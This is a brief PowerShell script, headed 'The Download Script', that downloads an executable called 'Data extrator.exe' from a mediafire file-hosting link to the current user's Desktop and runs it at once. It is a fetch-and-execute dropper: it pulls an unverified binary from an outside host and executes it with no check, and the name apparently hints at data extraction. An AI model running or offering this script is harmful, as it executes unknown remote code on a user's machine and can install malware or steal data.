#The Download Script
$uri = "http://download1076.mediafire.com/y73t7w9u12ag/6j82a346gisordq/Data+extrator.exe"
$out = "c:\Users\$env:UserName\Desktop\DataExtractor.exe"
Invoke-WebRequest -Uri $uri -OutFile $out
& $out